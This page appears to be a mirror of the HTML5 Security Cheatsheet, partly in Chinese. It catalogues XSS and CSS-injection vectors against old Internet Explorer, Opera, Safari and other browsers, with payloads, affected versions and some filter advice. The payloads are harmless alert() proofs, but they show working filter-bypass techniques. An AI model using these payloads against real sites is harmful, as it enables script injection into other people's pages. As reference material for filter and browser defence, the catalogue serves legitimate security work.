<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;img src=&#34;x` `&#60;script&#62;alert(1)&#60;/script&#62;&#34;` `&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>internet explorer 6.0</li>
<li><p>internet explorer 8.0 (unpatched)</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>internet explorer</li>
<li>parser</li>
<li>backtick</li>
<li><p>plaintext</p>
</li>
<li><p><a href="#62">#62</a></p>
</li>
<li><a href="#108">#108</a></li>
<li><a href="#133">#133</a></li>
</ul>
<p>reporter：.mario, hasegawayosuke</p>
<h3 id="Safari_attribute_ofuscation_with_slashes_and_quotes#106test">Safari attribute ofuscation with slashes and quotes<a href="#106">#106</a><a href="test/#106">test</a></h3><p>Safari accepts slashes and quotes (if preceded by whitespace, slashes or other quotes) between attribute names and the equals character (name/“‘=value). This enables interesting possibilities to obfuscate HTML strings, bypass filters and mimick attributes like in the given example.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;img src onerror /&#34; &#39;&#34;= alt=alert(1)//&#34;&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>safari 4.0</li>
<li><p>safari 4.0.3</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>safari</li>
<li>attributes</li>
<li>delimiter</li>
<li>parser</li>
</ul>
<p>reporter：Superhei, .mario</p>
<h3 id="JavaScript_execution_via_&lt;TITLE&gt;_tag_on_Inernet_Explorer_9#107test">JavaScript execution via &lt;TITLE&gt; tag on Inernet Explorer 9<a href="#107">#107</a><a href="test/#107">test</a></h3><p>Internet Explorer 9 allows execution of JavaScript via onpropertychange event handler on &lt;title&gt; tags if another &lt;title&gt; tag follows up - having at least one valid attribute. This vector works in IE6-8 Standards mode and in IE9 quirks mode.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;title onpropertychange=alert(1)&#62;&#60;/title&#62;&#60;title title=&#62;&#60;/title&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>internet explorer 6.0</li>
<li><p>internet explorer latest (in older docmodes)</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>title</li>
<li>onpropertychange</li>
<li>internet explorer</li>
</ul>
<p>reporter：.mario</p>
<h3 id="Internet_Explorer_parameter_parsing_issue#108test">Internet Explorer parameter parsing issue<a href="#108">#108</a><a href="test/#108">test</a></h3><p>Internet Explorer treats the sequence of any quotes that follows the equal sign in a parameter without delimiters as the beginning of some semblance of new parameter.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;!-- IE 5-8 standards mode --&#62; &#60;a href=http://foo.bar/#x=`y&#62;&#60;/a&#62;&#60;img alt=&#34;`&#62;&#60;img src=xx:x onerror=alert(1)&#62;&#60;/a&#62;&#34;&#62; &#60;!-- IE 5-9 standards mode --&#62; &#60;!a foo=x=`y&#62;&#60;img alt=&#34;`&#62;&#60;img src=xx:x onerror=alert(2)//&#34;&#62; &#60;?a foo=x=`y&#62;&#60;img alt=&#34;`&#62;&#60;img src=xx:x onerror=alert(3)//&#34;&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>internet explorer 6.0</li>
<li><p>internet explorer latest (in older docmodes)</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>parameter</li>
<li>parsing</li>
<li><p>internet explorer</p>
</li>
<li><p><a href="#62">#62</a></p>
</li>
<li><a href="#102">#102</a></li>
</ul>
<p>reporter：Algol, jackmasa, sirdarckcat</p>
<h3 id="Internet_Explorer_conditional_comments_-_XSS_via_[if]&gt;_and_&lt;img&gt;_injection#115test">Internet Explorer conditional comments - XSS via [if]&gt; and &lt;img&gt; injection<a href="#115">#115</a><a href="test/#115">test</a></h3><p>Conditional comments on Internet Explorer can cause trouble as soon as an attacker is able to inject rectangular brackets wrapping the words if and endif with almost arbitrary suffixes. A condition always being true will lead to immediate parsing of the enclosed markup on all tested Internet Explorer versions. The second example injects an &lt;img&gt; tag into the comment condition leading to immediate JavaScript execution as well. The examples are worked up to IE 9 standards mode.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;!--[if]&#62;&#60;script&#62;alert(1)&#60;/script --&#62; &#60;!--[if&#60;img src=x onerror=alert(2)//]&#62; --&#62;</span><br></pre></td></tr></table></figure>
<p>Make sure an attacker cannot turn a comment injection into a conditional comment by using rectangular brackets such as shown in the example. Comment content should be escaped like regular markup - the delimiting sequence –&gt; is neither sufficient nor necessary to successfully close a comment.</p>
<ul>
<li>internet explorer 6.0</li>
<li><p>internet explorer latest (in older docmodes)</p>
</li>
<li><p>xss</p>
</li>
<li>conditional</li>
<li>comments</li>
<li>internet explorer</li>
<li><p>rectangular</p>
</li>
<li><p><a href="http://msdn.microsoft.com/en-us/library/ms537512%28v=vs.85%29.aspx" target="_blank" rel="external">http://msdn.microsoft.com/en-us/library/ms537512%28v=vs.85%29.aspx</a></p>
</li>
<li><a href="#37">#37</a></li>
<li><a href="#38">#38</a></li>
</ul>
<p>reporter：.mario</p>
<h3 id="Webkit_浏览器中反斜线替代斜线#124test">Webkit 浏览器中反斜线替代斜线<a href="#124">#124</a><a href="test/#124">test</a></h3><p>Safari 将内部URL属性中的反斜线当作斜线处理。chrome将URL头的”/\”当作”//”处理</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;script src=&#34;/\example.com\foo.js&#34;&#62;&#60;/script&#62; // Safari 5.0, Chrome 9, 10 &#60;script src=&#34;\\example.com\foo.js&#34;&#62;&#60;/script&#62; // Safari 5.0</span><br></pre></td></tr></table></figure>
<ul>
<li>chrome 9.0</li>
<li><p>chrome latest</p>
</li>
<li><p>safari 5.0</p>
</li>
<li><p>safari latest</p>
</li>
<li><p>html</p>
</li>
<li>dom</li>
</ul>
<p>reporter：hasegawayosuke</p>
<h3 id="QuickTime_事件导致JavaScript代码执行#126test">QuickTime 事件导致JavaScript代码执行<a href="#126">#126</a><a href="test/#126">test</a></h3><p>在上方展示的经过构造的用法或多或少会触发QuickTime的未知DOM事件。那些包含下划线”_”的事件句柄很罕见，使它可以绕过大多数黑名单过滤。这一攻击只有满足以下条件才能生效：两个&lt;object&gt;标签；前一个&lt;object&gt;标签为后一个&lt;object&gt;标签提供了必要的behavior</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;object id=&#34;x&#34; classid=&#34;clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598&#34;&#62;&#60;/object&#62; &#60;object classid=&#34;clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B&#34; onqt_error=&#34;alert(1)&#34; style=&#34;behavior:url(#x);&#34;&#62;&#60;param name=postdomevents /&#62;&#60;/object&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>internet explorer 6.0</li>
<li><p>internet explorer 10.0</p>
</li>
<li><p>quicktime</p>
</li>
<li>html</li>
<li>event</li>
<li>object</li>
<li>classid</li>
<li><p>xss</p>
</li>
<li><p><a href="http://developer.apple.com/library/mac/#documentation/QuickTime/Conceptual/…ocument/QuickTimeandJavaScri.html#//apple_ref/doc/uid/TP40001526-CH001-SW6" target="_blank" rel="external">http://developer.apple.com/library/mac/#documentation/QuickTime/Conceptual/…ocument/QuickTimeandJavaScri.html#//apple_ref/doc/uid/TP40001526-CH001-SW6</a></p>
</li>
</ul>
<p>reporter：.mario</p>
<h3 id="使用属性界定符打破IE注释元素#133test">使用属性界定符打破IE注释元素<a href="#133">#133</a><a href="test/#133">test</a></h3><p>在IE9以下的版本中中可以使用`打破注释元素</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;!-- `&#60;img/src=xx:xx onerror=alert(1)//--!&#62;</span><br></pre></td></tr></table></figure>
<p>不允许用户提交注释标签</p>
<ul>
<li>internet explorer 6.0</li>
<li><p>internet explorer 8.0</p>
</li>
<li><p>xss</p>
</li>
<li>comments</li>
<li>internet explorer</li>
<li><p>backtick</p>
</li>
<li><p><a href="#62">#62</a></p>
</li>
<li><a href="#102">#102</a></li>
<li><a href="#115">#115</a></li>
</ul>
<p>reporter：jackmasa</p>
<h3 id="“&lt;%_%&gt;”_and_“&lt;!–_–&gt;”_inside_plaintext_tags#134test">“&lt;% %&gt;” and “&lt;!– –&gt;” inside plaintext tags<a href="#134">#134</a><a href="test/#134">test</a></h3><p>Structures “&lt;%” и “&lt;!–” allow the IE parser to consider closing tag in plaintext tags such as &lt;textarea&gt;, &lt;comment&gt;, &lt;xmp&gt; and others as a part of the plaintext until it finds the structure “%&gt;” or “–&gt;”. The syntax in the tags such as &lt;style&gt;, &lt;script&gt; should be valid taking into account these sections, otherwise throws an exception. So, the second example shows that closing &lt;/script&gt; tag will be considered as an operator “less” and the regular expression start. The examples are worked up to IE 9 standards mode. SGML-like comment delimiters is similarly parsed in older versions of Safari.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;xmp&#62; &#60;% &#60;/xmp&#62; &#60;img alt=&#39;%&#62;&#60;/xmp&#62;&#60;img src=xx:x onerror=alert(1)//&#39;&#62; &#60;script&#62; x=&#39;&#60;%&#39; &#60;/script&#62; %&#62;/ alert(2) &#60;/script&#62; XXX &#60;style&#62; *[&#39;&#60;!--&#39;]&#123;&#125; &#60;/style&#62; --&#62;&#123;&#125; *&#123;color:red&#125;&#60;/style&#62;</span><br></pre></td></tr></table></figure>
<p>Encode all opening brakets inside plaintext tags. Escape for the closing tags (“&lt;\/script&gt;”) is not sufficient.</p>
<ul>
<li>internet explorer 6.0</li>
<li><p>internet explorer latest (in older docmodes)</p>
</li>
<li><p>safari 3.0</p>
</li>
<li><p>safari 4.0.3</p>
</li>
<li><p>xss</p>
</li>
<li>plaintext</li>
<li>internet explorer</li>
<li>safari</li>
<li>comment</li>
<li>SGML</li>
<li><p>escape</p>
</li>
<li><p><a href="#91">#91</a></p>
</li>
<li><a href="#38">#38</a></li>
<li><a href="#40">#40</a></li>
</ul>
<p>reporter：sirdarckcat, wpulog</p>
<h2 id="基于CSS注入的向量">基于CSS注入的向量</h2><h3 id="使用Opera的CSS属性link-source执行javascript#9test">使用Opera的CSS属性link-source执行javascript<a href="#9">#9</a><a href="test/#9">test</a></h3><p>Opera允许给任何HTML元素设置link sources,它们将可以点击和执行javascript.注意:opera 11要求是&lt;a&gt;标签,早期版本任意</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;a style=&#34;-o-link:&#39;javascript:alert(1)&#39;;-o-link-source:current&#34;&#62;X&#60;/a&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>opera 8.0</li>
<li><p>opera 12.0 (limited)</p>
</li>
<li><p>xss</p>
</li>
<li>css</li>
<li>link-source</li>
<li>opera</li>
<li><p>proprietary</p>
</li>
<li><p><a href="http://www.aptana.com/reference/html/api/CSS.field.-o-link-source.html" target="_blank" rel="external">http://www.aptana.com/reference/html/api/CSS.field.-o-link-source.html</a></p>
</li>
<li><a href="https://hackvertor.co.uk/hvurl/3c" target="_blank" rel="external">https://hackvertor.co.uk/hvurl/3c</a></li>
</ul>
<p>reporter：.mario</p>
<h3 id="Opera_whole-page_click_hijacking_via_CSS#27test">Opera whole-page click hijacking via CSS<a href="#27">#27</a><a href="test/#27">test</a></h3><p>Opera as well as other browsers allow to break out attribute selectors and other CSS constructs with {…} - opening the possibility for declaring new properties and assigning values - such as -o-link and -o-link-source. In this case those proprietary properties allow overlaying any selected element with a JavaScript URI link href. Note that as of Opera 11 -o-link only applies for &lt;a&gt; tags. On IE selector is broken up to IE 7 standards mode.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;style&#62;p[foo=bar&#123;&#125;*&#123;-o-link:&#39;javascript:alert(1)&#39;&#125;&#123;&#125;*&#123;-o-link-source:current&#125;*&#123;background:red&#125;]&#123;background:green&#125;;&#60;/style&#62;</span><br></pre></td></tr></table></figure>
<p>In case users are allowed to submit CSS make sure the properties allowed are whitelisted and attribute selector content does not allow the combination {…} because it breaks out the attribute selector and allows declaration of new properties.</p>
<ul>
<li>opera 8.x</li>
<li><p>opera 11.64</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>css</li>
<li>opera</li>
<li>attribute selectors</li>
<li><p>proprietary</p>
</li>
<li><p><a href="http://www.aptana.com/reference/html/api/CSS.field.-o-link-source.html" target="_blank" rel="external">http://www.aptana.com/reference/html/api/CSS.field.-o-link-source.html</a></p>
</li>
<li><a href="#9">#9</a></li>
</ul>
<p>reporter：.mario</p>
<h3 id="JavaScript_execution_via_&lt;LINK&gt;_href_attribute_and_data_URI#29test">JavaScript execution via &lt;LINK&gt; href attribute and data URI<a href="#29">#29</a><a href="test/#29">test</a></h3><p>Despite the existing documentation Internet Explorer 8 supports data URIs not only for displaying images but also supplying stylesheet information. This can be used to wrap expression() CSS into a data URI and execute JavaScript with a &lt;LINK&gt; tag. The example works up to IE 7 standards mode.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;link rel=stylesheet href=data:,*%7bx:expression(write(1))%7d</span><br></pre></td></tr></table></figure>
<p>Make sure stylesheet URIs cannot be controlled by the user - and user submitted &lt;LINK&gt; tags will not be displayed unfiltered.</p>
<ul>
<li>internet explorer 8.0</li>
<li><p>internet explorer 10.0</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>internet explorer</li>
<li>css</li>
<li>style</li>
<li>expression</li>
<li>datauri</li>
<li>proprietary</li>
</ul>
<p>reporter：.mario</p>
<h3 id="JavaScript_execution_via_&lt;STYLE&gt;_@import_and_data_URI#30test">JavaScript execution via &lt;STYLE&gt; @import and data URI<a href="#30">#30</a><a href="test/#30">test</a></h3><p>Despite the existing documentation Internet Explorer 8 supports data URIs not only for displaying images but also supplying stylesheet information. This can be used to wrap expression() CSS into a data URI and execute JavaScript with a &lt;STYLE&gt; @import directive. The example works up to IE 7 standards mode.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;style&#62;@import &#34;data:,*%7bx:expression(write(1))%7D&#34;;&#60;/style&#62;</span><br></pre></td></tr></table></figure>
<p>Make sure stylesheet URIs cannot be controlled by the user - and user submitted &lt;STYLE&gt; cannot contain the @import directive.</p>
<ul>
<li>internet explorer 8.0</li>
<li><p>internet explorer 10.0</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>internet explorer</li>
<li>css</li>
<li>style</li>
<li>expression</li>
<li>datauri</li>
<li><p>proprietary</p>
</li>
<li><p><a href="http://msdn.microsoft.com/en-us/library/ms530768%28VS.85%29.aspx" target="_blank" rel="external">http://msdn.microsoft.com/en-us/library/ms530768%28VS.85%29.aspx</a></p>
</li>
</ul>
<p>reporter：.mario</p>
<h3 id="Breaking_pointer-events:none_with_nested_links#33test">Breaking pointer-events:none with nested links<a href="#33">#33</a><a href="test/#33">test</a></h3><p>Firefox 3.6+ allows using CSS “pointer-events” with value “none” to make sure an element will not react on any mouse/pointer based event. This feature enables for example placing a DIV over another DIV without blocking the click events addressed to the underlying DIV.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;a style=&#34;pointer-events:none;position:absolute;&#34;&#62;&#60;a style=&#34;position:absolute;&#34; onclick=&#34;alert(1);&#34;&#62;XXX&#60;/a&#62;&#60;/a&#62;&#60;a href=&#34;javascript:alert(2)&#34;&#62;XXX&#60;/a&#62;</span><br></pre></td></tr></table></figure>
<p>The feature breaks as soon as &lt;A&gt; elements are being used in combination with “pointer-events:none” - containing other &lt;A&gt; elements. &lt;A&gt; elements should not be used for pointer-event logic at all - especially not when containing user controlled HTML.</p>
<ul>
<li>firefox 3.6</li>
<li><p>firefox latest</p>
</li>
<li><p>safari 5.0</p>
</li>
<li><p>safari latest</p>
</li>
<li><p>chrome 7.0</p>
</li>
<li><p>chrome latest</p>
</li>
<li><p>internet explorer 10.0</p>
</li>
<li><p>internet explorer latest</p>
</li>
<li><p>opera 10.0</p>
</li>
<li><p>opera latest</p>
</li>
<li><p>xss</p>
</li>
<li>hijacking</li>
<li>css</li>
<li>pointer-events</li>
<li>firefox</li>
<li>safari</li>
<li><p>chrome</p>
</li>
<li><p><a href="http://hacks.mozilla.org/2009/12/pointer-events-for-html-in-firefox-3-6/" target="_blank" rel="external">http://hacks.mozilla.org/2009/12/pointer-events-for-html-in-firefox-3-6/</a></p>
</li>
</ul>
<p>reporter：.mario</p>
<h3 id="Opera_@import_based_XSS_inside_attribute_selectors#44test">Opera @import based XSS inside attribute selectors<a href="#44">#44</a><a href="test/#44">test</a></h3><p>Opera 10 and later version including latest Opera 10.5 allow breaking out an attribute selector with {} and use @import declarations afterwards. The MIME type for the imported file does not matter - also it can be loaded from arbitrary domains. The imported file contains CSS code to apply a JavaScript URI to all elements on the page to hijack any incoming click.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;style&#62;*[&#123;&#125;@import&#39;test.css?]&#123;color: green;&#125;&#60;/style&#62;X</span><br></pre></td></tr></table></figure>
<p>Make sure in user submitted CSS the contents of attribute selectors are properly escaped with backslashes. Also make sure to use a CSS property:value whitelist to forbid properties like -o-link and -o-link-source.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* &#123;-o-link:&#39;javascript:alert(1)&#39;;-o-link-source: current;&#125;crossdomain: 1path: [http://html5sec.org/test.css](http://html5sec.org/test.css)name: test.css</span><br></pre></td></tr></table></figure>
<ul>
<li>opera 8.0</li>
<li><p>opera 11.64</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>opera</li>
<li>css</li>
<li>hijacking</li>
<li>proprietary</li>
</ul>
<p>reporter：.mario</p>
<h3 id="CSS-string_breaking#45test">CSS-string breaking<a href="#45">#45</a><a href="test/#45">test</a></h3><p>Opera, Firefox and other browsers allow breaking out an css-string with newline symbols. A string cannot directly contain a newline in CSS2+. [a] Characters<em>, accepted as CCS-strings breakers: Firefox, Internet Explorer (IE8+ standards mode), Opera, Google Chrome, Safari: 10,12,13 Opera 11.01↓, Google Chrome 16↓, Safari: 1-8,11,14-31,127 Opera 11.01↓: 0 </em> Characters are given as decimal ASCII table index.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;div style=&#34;font-family:&#39;foo[a];color:red;&#39;;&#34;&#62;XXX&#60;/div&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>opera 8.0</li>
<li><p>opera latest</p>
</li>
<li><p>firefox 1.x</p>
</li>
<li><p>firefox latest</p>
</li>
<li><p>chrome 3.0</p>
</li>
<li><p>chrome latest</p>
</li>
<li><p>safari 3.0</p>
</li>
<li><p>safari latest</p>
</li>
<li><p>internet explorer 8.0</p>
</li>
<li><p>internet explorer latest</p>
</li>
<li><p>trick</p>
</li>
<li>opera</li>
<li>firefox</li>
<li>chrome</li>
<li>firefox</li>
<li>internet explorer</li>
<li>css</li>
</ul>
<p>reporter：LeverOne, Michal Zalewski</p>
<h3 id="Alternative_CSS_syntax_in_Internet_Explorer#46test">Alternative CSS syntax in Internet Explorer<a href="#46">#46</a><a href="test/#46">test</a></h3><p>Internet Explorer allows to use right curly brace (}) as a group separator (up to IE 7 standards mode). A CSS declaration in quirks mode (IE 5 standards mode) may consist of a property name, followed by a symbol of equality (=).</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;div style=&#34;font-family:foo&#125;color=red;&#34;&#62;XXX&#60;/div&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>internet explorer 5.5</li>
<li><p>internet explorer latest (in older docmodes)</p>
</li>
<li><p>xss</p>
</li>
<li>internet explorer</li>
<li>css</li>
<li>quirks mode</li>
<li>proprietary</li>
<li>trick</li>
</ul>
<p>reporter：Gareth, LeverOne, sirdarckcat</p>
<h3 id="Obfuscation_css-properties_and_values_via_ignored_extra_characters#60test">Obfuscation css-properties and values via ignored extra characters<a href="#60">#60</a><a href="test/#60">test</a></h3><p>[a] Extra characters<em> ignored before property names (excluding backslash (92) and null character (0)) Firefox, Internet Explorer (any modes), Safari, Google Chrome, Opera : 9,10,12,13,32 Firefox, Internet Explorer<strong>, Opera: 123</strong></em> Firefox 3.x, Internet Explorer<strong>: 8 Internet Explorer</strong>: 1-7,11,14-31,33,35-38,40-44,46-47,58,60-64,91,93-96,124-127,160,8192-8203,12288,65279 Internet Explorer<strong>: CSS-strings [b] Extra characters ignored between property names and colon. Firefox, Internet Explorer (any modes), Safari, Google Chrome, Opera : 9,10,12,13,32 Internet Explorer</strong>: 11 Internet Explorer (quirks mode): 1-8,14-31,33,35-38,40-44,46-47,60,62-64,91,93,94,96,123,124,126,127 Internet Explorer (quirks mode): CSS-strings, alnum sequences after non-alnum characters (color,foo:red) [c] Extra characters ignored before values Firefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32 Internet Explorer: 0,11,160,8192-8203,12288,65279 <em> These are given in decimal codes. <strong> Up to IE 7 standards mode. </strong></em> Ignored only before first property names.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;div style=&#34;[a]color[b]:[c]red&#34;&#62;XXX&#60;/div&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>firefox 2.x</li>
<li><p>firefox latest</p>
</li>
<li><p>opera 9.x</p>
</li>
<li><p>opera latest</p>
</li>
<li><p>internet explorer 6.0</p>
</li>
<li><p>internet explorer latest</p>
</li>
<li><p>chrome 5.0</p>
</li>
<li><p>chrome latest</p>
</li>
<li><p>safari 4.0</p>
</li>
<li><p>safari latest</p>
</li>
<li><p>trick</p>
</li>
<li>css</li>
<li>quirks mode</li>
<li>obfuscation</li>
<li>opera</li>
<li>firefox</li>
<li>internet explorer</li>
<li>chrome</li>
<li>safari</li>
<li>fuzzing</li>
<li>quirks mode</li>
</ul>
<p>reporter：Gareth, hasegawayosuke, LeverOne, .mario, RSnake, sirdarckcat</p>
<h3 id="CSS_encoding_and_escaping#61test">CSS encoding and escaping<a href="#61">#61</a><a href="test/#61">test</a></h3><p>[a] Encoding. There are only three tricks to encode characters. [1] You can change the number of zeros: \0A -&gt; \00000A [2] You can change the capital letter: \0A -&gt; \0a [3] You can change the whitespace<em> accepted as delimiters after the encoded character. Firefox, Google Chrome, Internet Explorer, Opera, Safari: 9,10,12,13,32 Internet Explorer (IE7↓ Standards mode): 11,160,8192-8203,12288,65279 Properties in IE7↓ Standards mode may contain encoded null-character (\0). On Opera and in IE8+ Standards mode encoded null-character cuts off the right side of a CSS structure. The volume of possible encoding is different in the browsers. For example, FF can not encode parentheses, which is part of the functional notation. [b] Escaping. In addition, you can put a backslash before the character. Option of writing a null-character in Internet Explorer 7↓ Standards mode is escaping of any whitespace-character accepted as delimiters: col\&amp;#160or:red In IE quirks mode inside the url() function a backslash can be treated as equivalent of a slash and thus will not have the escape role. Of course, these methods can be combined with other encoding and obfuscation (for example, change case of original characters). </em> These are given in decimal codes.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;div style=&#34;\63&#38;#9\06f&#38;#10\0006c&#38;#12\00006F&#38;#13\R:\000072 Ed;color\0\bla:yellow\0\bla;col\0\00 \&#38;#xA0or:blue;&#34;&#62;XXX&#60;/div&#62;</span><br></pre></td></tr></table></figure>
<ul>
<li>firefox 1.5</li>
<li><p>firefox latest</p>
</li>
<li><p>opera 8.0</p>
</li>
<li><p>opera latest</p>
</li>
<li><p>internet explorer 6.0</p>
</li>
<li><p>internet explorer latest</p>
</li>
<li><p>chrome 7.0</p>
</li>
<li><p>chrome latest</p>
</li>
<li><p>safari 4.0</p>
</li>
<li><p>safari latest</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>css</li>
<li>encoding</li>
<li>escape</li>
<li>backslash</li>
<li>opera</li>
<li>firefox</li>
<li><p>internet explorer</p>
</li>
<li><p><a href="http://www.w3.org/TR/css3-syntax/#characters" target="_blank" rel="external">http://www.w3.org/TR/css3-syntax/#characters</a></p>
</li>
<li><a href="http://www.w3.org/TR/CSS2/syndata.html#escaped-characters" target="_blank" rel="external">http://www.w3.org/TR/CSS2/syndata.html#escaped-characters</a></li>
</ul>
<p>reporter：Gareth, LeverOne, Renaud Lifchitz, .mario</p>
<h3 id="Slash-tags_accepting_style_attributes#71test">Slash-tags accepting style attributes<a href="#71">#71</a><a href="test/#71">test</a></h3><p>A slash-tag can still contain style attributes on IE as the example shows. For extra obfuscation a bogus CSS property is being used to execute the JavaScript via expression() combined with CSS escapes. This example works up to IE 7 standards mode.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;// style=x:expression\28write(1)\29&#62;</span><br></pre></td></tr></table></figure>
<p>Make sure the HTML filter you use deals with slash-tags and doesn’t consider them to be plain text. Also be aware of CSS escapes and how they can completely obfuscate any style info inside &lt;STYLE&gt; tags and “style” attributes.</p>
<ul>
<li>internet explorer 6.0</li>
<li><p>internet explorer 10.0</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>closing tag</li>
<li>css</li>
<li>style</li>
<li>expression</li>
<li>internet explorer</li>
<li><p>quirks mode</p>
</li>
<li><p><a href="http://msdn.microsoft.com/en-us/library/ms537634%28VS.85%29.aspx" target="_blank" rel="external">http://msdn.microsoft.com/en-us/library/ms537634%28VS.85%29.aspx</a></p>
</li>
<li><a href="http://www.w3.org/TR/CSS2/syndata.html" target="_blank" rel="external">http://www.w3.org/TR/CSS2/syndata.html</a></li>
</ul>
<p>reporter：Gareth, .mario</p>
<h3 id="IE6_and_halfwidth/fullwidth_Unicode_characters#80test">IE6 and halfwidth/fullwidth Unicode characters<a href="#80">#80</a><a href="test/#80">test</a></h3><p>This example shows how halfwidth/fullwidth Unicode characters can be used on IE6 to substitute characters from the ASCII range. Note that those characters have been used in the example to create the term “expression”.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;style&#62;*&#123;x:&#65349;&#65368;&#65360;&#65362;&#65349;&#65363;&#65363;&#65353;&#65359;&#65358;(write(1))&#125;&#60;/style&#62;</span><br></pre></td></tr></table></figure>
<p>In case your website still has a lot of IE6 users make sure that the range of halfwidth and fullwidth form characters (U+FF00-FFEF) cannot be used in user submitted markup and styles.</p>
<ul>
<li><p>internet explorer 6.0</p>
</li>
<li><p>xss</p>
</li>
<li>javascript</li>
<li>css</li>
<li>expression</li>
<li>unicode</li>
<li>halfwidth</li>
<li>fullwidth</li>
<li><p>internet explorer</p>
</li>
<li><p><a href="http://en.wikipedia.org/wiki/Halfwidth_and_Fullwidth_Forms_Unicode_block" target="_blank" rel="external">http://en.wikipedia.org/wiki/Halfwidth_and_Fullwidth_Forms_Unicode_block</a></p>
</li>
</ul>
<p>reporter：.mario</p>
<h3 id="SVG_images_containing_XML_data_-_with_disabled_JavaScript#90test">SVG images containing XML data - with disabled JavaScript<a href="#90">#90</a><a href="test/#90">test</a></h3><p>Opera supports the CSS property “content” for style attributes. The SVG image can contain SVG as well as HTML code. The example for Opera 10.x shows how a &lt;FORM&gt; tag can be used to trick the user into clicking a button and thus executing JavaScript. Example for Opera 12.x shows one of the problems (along with a client side DoS, running the “onblur” event, etc), which is generated because of the possibility to steal a focus via embeded SVG image. The same works of course for SVG files embedded via &lt;IMG&gt; tags.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;!-- Up to Opera 10.63 --&#62; &#60;div style=content:url(test2.svg)&#62;&#60;/div&#62; &#60;!-- Up to Opera 11.64 - see link below --&#62; &#60;!-- Up to Opera 12.x --&#62; &#60;div style=&#34;background:url(test5.svg)&#34;&#62;PRESS ENTER&#60;/div&#62;``&#60;form xmlns=&#34;http://www.w3.org/1999/xhtml&#34; target=&#34;_top&#34; action=&#34;javascript:alert(1)&#34;&#62; &#60;!-- this file can be crossdomain if &#34;action&#34; attribute refers to an external file --&#62; &#60;meta http-equiv=&#34;refresh&#34; content=&#34;1;URL=test5.svg&#34;/&#62; &#60;input type=&#34;submit&#34; autofocus=&#34;autofocus&#34;/&#62; &#60;/form&#62;required_mime: image/svg+xmlcrossdomain: 0path: [http://html5sec.org/test5.svg](http://html5sec.org/test5.svg)name: test5.svg</span><br></pre></td></tr></table></figure>
<ul>
<li>opera 10.x</li>
<li><p>opera 12.0</p>
</li>
<li><p>xss</p>
</li>
<li>svg</li>
<li>css</li>
<li>opera</li>
<li>content</li>
<li><p>form</p>
</li>
<li><p><a href="http://heideri.ch/opera/" target="_blank" rel="external">http://heideri.ch/opera/</a></p>
</li>
</ul>
<p>reporter：LeverOne</p>
